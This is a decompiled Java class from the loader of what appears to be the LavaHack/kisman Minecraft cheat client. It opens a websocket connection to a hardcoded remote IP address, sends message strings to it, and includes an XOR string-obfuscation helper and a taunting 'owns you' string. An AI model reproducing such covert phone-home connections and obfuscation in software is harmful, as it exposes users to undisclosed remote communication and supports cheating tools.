//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\hitmanqq\Documents\Decompiler\mappings"!

//Decompiled by Procyon!

package lavahack.loader;

import kotlin.*;
import org.jetbrains.annotations.*;
import com.kisman.cc.loader.*;
import kotlin.jvm.internal.*;

@Metadata(mv = { 1, 1, 13 }, bv = { 1, 0, 3 }, k = 2, d1 = { "\u0000(\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\u001a\u0006\u0010\n\u001a\u00020\u000b\u001a\u000e\u0010\f\u001a\u00020\u000b2\u0006\u0010\r\u001a\u00020\u000e\u001a\u000e\u0010\u000f\u001a\u00020\u00052\u0006\u0010\u0010\u001a\u00020\u0011\"\u0011\u0010\u0000\u001a\u00020\u0001?\u0006\b\n\u0000\u001a\u0004\b\u0002\u0010\u0003\"\u001c\u0010\u0004\u001a\u0004\u0018\u00010\u0005X\u0086\u000e?\u0006\u000e\n\u0000\u001a\u0004\b\u0006\u0010\u0007\"\u0004\b\b\u0010\t?\u0006\u0012" }, d2 = { "DUMMY_MESSAGE_PROCESSOR", "Lcom/kisman/cc/loader/websockets/DummyMessageProcessor;", "getDUMMY_MESSAGE_PROCESSOR", "()Lcom/kisman/cc/loader/websockets/DummyMessageProcessor;", "client", "Lcom/kisman/cc/loader/websockets/WebClient;", "getClient", "()Lcom/kisman/cc/loader/websockets/WebClient;", "setClient", "(Lcom/kisman/cc/loader/websockets/WebClient;)V", "initClient", "", "reportIssue", "message", "", "setupClient", "messageProcessor", "Lcom/kisman/cc/loader/websockets/IMessageProcessor;", "kisman.cc" })
public final class Class964
{
    @Nullable
    private static Class800 Field12112;
    @NotNull
    private static final Class922 Field12113;
    private String Field12114 = "TheKisDevs & LavaHack Development owns you";
    
    @Nullable
    @Nullable
    public static final Class800 Method3953() {
        return Class964.Field12112;
    }
    
    public static final void Method3954(@Nullable @Nullable final Class800 field12112) {
        Class964.Field12112 = field12112;
    }
    
    @NotNull
    @NotNull
    public static final Class922 Method3955() {
        return Class964.Field12113;
    }
    
    public static final void Method3956() {
        LavaHackLoaderCoreMod.Companion.getLOGGER().info("Connecting to remove server");
        Class964.Field12112 = Method3958((Class122)new agYEaptPUW8OPC6jB7DK1WZuIoCKRIex());
    }
    
    public static final void Method3957(@NotNull @NotNull final String str) {
        Intrinsics.checkParameterIsNotNull((Object)str, "message");
        final Class800 field12112 = Class964.Field12112;
        if (field12112 != null) {
            field12112.Method3322("sendmessage Received new message: \"" + str + '\"');
        }
    }
    
    @NotNull
    @NotNull
    public static final Class800 Method3958(@NotNull @NotNull final Class122 class122) {
        Intrinsics.checkParameterIsNotNull((Object)class122, "messageProcessor");
        final Class800 class123 = new Class800("161.97.78.143", 25563, class122);
        final Thread currentThread = Thread.currentThread();
        Intrinsics.checkExpressionValueIsNotNull((Object)currentThread, "Thread.currentThread()");
        class123.Method3380(currentThread);
        return class123;
    }
    
    static {
        Field12113 = new Class922();
    }
    
    private static String Method3959(final String s) {
        if (s != null) {
            final char[] charArray = s.toCharArray();
            final char[] value = new char[charArray.length];
            for (int i = 0; i < charArray.length; ++i) {
                value[i] = (char)(charArray[i] ^ (0x5776 ^ 0x8B));
            }
            return new String(value);
        }
        throw new NullPointerException("String deobfuscation parameter should not be null");
    }
}
